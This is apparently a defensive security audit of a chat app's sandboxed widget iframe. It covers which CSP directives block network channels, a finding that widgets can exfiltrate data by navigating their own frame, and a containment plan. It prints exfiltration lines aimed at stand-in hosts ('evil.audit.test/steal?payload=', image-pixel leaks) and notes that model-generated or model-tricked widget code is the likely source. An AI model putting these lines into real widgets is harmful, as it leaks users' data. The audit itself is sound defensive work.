# Widget CSP resource and network boundary audit

Defensive audit for [#19](https://github.com/dreamfarer-space/deepseek-harness-intelligent-ui/issues/19).
It records what the sandbox actually enforces today, which grants are wider than
they need to be, and the one channel that turned out to be exploitable. Nothing
here is a claimed CVE, and no user data is known to have leaked.

Measurements come from `scripts/security/audit.mjs`, which renders the real
`buildFrameDocument()` output in Chrome inside a real
`sandbox="allow-scripts allow-forms"` iframe and records every request the
browser attempts. It is a regression test, not a one-off: `npm run e2e:security`.

## What `allowNetwork=false` guarantees

`connect-src 'none'` is only the script-visible network. The full set of
directives is what decides reachability:

| Channel | Directive that governs it | `allowNetwork=false` |
|---|---|---|
| `fetch`, XHR, WebSocket, `EventSource`, `sendBeacon`, `<a ping>` | `connect-src` | blocked |
| `<img>` (incl. `srcset`, CSS `background`, SVG `<image>`) | `img-src` | **allowed to the CDN allowlist** |
| `<script src>`, `<link rel=stylesheet>`, `@import` | `script-src` / `style-src` | **allowed to the CDN allowlist** |
| `@font-face`, `document.fonts.load` | `font-src` | **allowed to the CDN allowlist** |
| `<video>`, `<audio>`, `media` | `media-src` | **allowed to the CDN allowlist** |
| `<iframe>`, `<object>`, `<embed>`, `<link rel=prefetch>` | `default-src 'none'` | blocked |
| Form submission | `form-action 'none'` | blocked |
| Download (`<a download>`) | iframe sandbox (no `allow-downloads`) | blocked |
| `window.open`, `target=_blank` | iframe sandbox (no `allow-popups`) | blocked |
| Top-level navigation (`top.location`) | iframe sandbox (no `allow-top-navigation`) | blocked by the sandbox |
| **Self-navigation (`location.href`, `location.replace`)** | **nothing** | **allowed** — see the finding below |
| `mailto:` / `tel:` links | nothing | allowed, but the user sees the handoff |

So `allowNetwork=false` means *no script-readable network access*. It does not
mean "no bytes leave the frame": any element whose directive carries a CDN
origin can still issue a request to that origin, and the URL is fully
attacker-chosen, path and query included. This is inherent to CSP — a source
list constrains the origin, never the path.

Measured, with `cdn: ['https://cdn.audit.test']` and `allowNetwork: false`:

- `new Image().src = 'https://cdn.audit.test/pixel.png?leak=<widget data>'` → request sent.
- `<script src='https://cdn.audit.test/x?leak=…'>`, `<link rel=stylesheet>`, `@font-face`
  → requests sent. None of these need a successful response; `onerror` is enough.
- The same URLs against `https://evil.audit.test` → all blocked. The allowlist
  does hold; only the allowlisted origins are reachable.

Consequences worth documenting rather than "fixing": an allowlisted CDN sees
whatever a widget puts in a resource URL. The origin allowlist is a
*reputation* boundary (these hosts already receive widget traffic), not a
*data-loss* boundary. Operators who need a hard egress boundary must set
`cdnAllowlist: []` (the offline bundle already forces this); with an empty
allowlist every resource directive collapses to `data:`/`blob:`/`'none'` and
the frame cannot reach the network at all.

## The finding: self-navigation is not contained

A CSP `navigate-to` directive was removed from the specification and never
shipped, so no `default-src`/`frame-src`/`form-action` value blocks a frame
navigating **itself**. The iframe sandbox does not block it either: it only
withholds top-level navigation. Measured:

```
widget:  location.href = 'https://evil.audit.test/steal?payload=' + encodeURIComponent(state)
result:  "document GET https://evil.audit.test/steal?payload=SENSITIVE-WIDGET-STATE"
```

That is an unrestricted one-way exfiltration channel — no CDN allowlist, no
`connect-src`, no `allowNetwork` involvement — available in the default,
strictest configuration.

It is worse than a single request, because the `WindowProxy` survives the
navigation and the host keeps posting into it. `WidgetFrame.post()` uses
`contentWindow.postMessage(msg, '*')`, and after the widget navigates away that
`contentWindow` is the foreign document:

```
host:  f.contentWindow.postMessage({ type:'rpc-result', id, ok:true,
                                     value:{ controlled:'CONTROLLED-DATA-VALUE' } }, '*')
evil:  received ["…\"value\":{\"controlled\":\"CONTROLLED-DATA-VALUE\"}…"]
```

The host also renders the foreign page inside the widget's card, under the
widget's title, which makes a convincing phishing surface: a 800×500 frame
inside a trusted chat that says "Sign in to continue".

Verified non-issues in this area: the frame token does not have to be guessed
because the host volunteers the data; `postMessage(…, 'null')` is rejected by
the browser as an invalid target origin, so an opaque origin *cannot* be a
precise target; and the host cannot inspect the frame (every cross-origin read
throws `SecurityError`), so `postMessage` plus the `load` event are the only
signals available.

### Why a liveness handshake was not used

The obvious refinement — after a second `load`, ask the frame to prove it is
still the widget's document — does not work. `document.open()`/`write()`
replaces the document **and destroys the `window` `message` listener** the
bootstrap registered, so a legitimately rewritten frame cannot answer either;
a handshake would strand it and gain nothing over the load signal alone.
Measured: after a rewrite the frame still has `window.Bridge` and `window.UI`
but receives no further host messages at all.

That fact also settles the compatibility question below: a widget that rewrites
its document has already lost the bridge, so there is no working widget to
protect in that state.

## Why the rest of the CSP is right

- `default-src 'none'` closes `frame-src`, `object-src`, `manifest-src`,
  `child-src` and prefetch. Confirmed blocked.
- `base-uri 'none'` and `form-action 'none'` are both exercised and effective.
- `connect-src 'none'` blocks fetch/XHR/WebSocket/`EventSource`/`sendBeacon`/
  `<a ping>` while leaving a readable error, and a nested blob worker inherits it
  (`fetch` → `TypeError`, `importScripts` → `NetworkError`).
- Injecting a second, permissive `<meta http-equiv=Content-Security-Policy>`
  and removing the original meta at runtime both leave the policy in force: a
  delivered CSP meta cannot be relaxed afterwards.
- The opaque origin holds: `parent.document`, `parent.localStorage`,
  `document.cookie`, `localStorage`, `sessionStorage`, `indexedDB`, `caches`
  all raise `SecurityError`; `window.origin === 'null'`; `document.referrer`
  is `''` under `referrerpolicy="no-referrer"`; `getUserMedia` raises
  `SecurityError` and geolocation is denied.
- Execution grants that are *needed*: `'unsafe-inline'` for the bootstrap and
  the widget payload, `'unsafe-eval'` for `run()`'s indirect `eval` of
  `jsFunctions`/`jsExpressions`, and `blob:` for the offline import map. None of
  these can be dropped without changing the product, and none of them widens
  what the frame can reach; they are execution permissions, not reach.
- `worker-src blob:` **is** needed: `canvas-confetti`, one of the advertised bare
  imports, runs its default `useWorker: true` path in a blob Worker. Verified
  that such a worker inherits both the frame's CSP (`fetch` → `TypeError`,
  `importScripts` → `NetworkError`) and its opaque origin (`self.origin === 'null'`),
  so the grant adds no reach — it only lets the documented library keep working.
  Dropping it makes `new Worker(blobURL)` fail with an `error` event.

## Plan

Ordered, smallest first; only the first item changes behaviour.

1. **Contain self-navigation (fix).** In `WidgetFrame`, treat the first `load`
   after mount as the frame's own and any later one as "the widget replaced its
   document". On that signal the host stops posting and unmounts the frame, so
   the foreign document is destroyed instead of being fed. There is no CSP
   change to make — `navigate-to` does not exist.
   Compatibility: every operation the widget contract actually performs
   (Idiomorph morphs, streaming html, theme updates, DOM work) stays on one
   document and fires no `load`, so it is unaffected. `document.open()`/`write()`
   *is* contained, correctly: a rewrite destroys the bootstrap's `message`
   listener, so that widget could never talk to the host again anyway.
2. **Keep `worker-src blob:` and record why** (canvas-confetti needs it; it adds
   no reach). No other grant can be removed without changing the product.
3. **Automate the matrix.** `scripts/security/audit.mjs` asserts every row of
   the table above plus the navigation containment, and runs in CI next to the
   other browser suites.
4. **Document the boundary.** This file, plus the security sections of both
   READMEs, so `allowNetwork=false` is not read as "no external resource
   requests".
5. **Not done here, worth a follow-up issue.** A per-widget "no external
   resources" switch would need a second policy field and a UI surface; the
   current `cdnAllowlist: []` already expresses it for a whole deployment.

## Risk assessment

- Severity of the navigation finding: medium. It needs a widget whose code
  navigates its own frame, which today means model-generated (or model-tricked)
  script, not a malicious dependency. The payoff is one-way exfiltration of
  whatever the widget already holds plus host-supplied RPC results, and a
  same-origin-looking phishing page inside the chat.
- Not a same-origin break: the foreign document cannot read host storage, and
  the opaque origin still denies everything the frame previously could not do.
- Compatibility: the fix only reacts to a document the widget replaced. All
  existing E2E scenarios, theme updates, streaming morphs and state persistence
  stay on the same-document path and are unaffected, and no CSP directive
  changed, so CDN loading behaves exactly as before.
- No grant was removed in the end. `worker-src blob:` looked droppable until
  `canvas-confetti` turned out to need it; the execution grants are all load-
  bearing. What changed is containment, not the permission set — worth stating
  plainly so a future reader does not assume the CSP was narrowed.

## Reproducing

```sh
npm run e2e:security     # Chrome required, like the other browser suites
```

The script prints one line per channel and fails on any mismatch with the table
above.
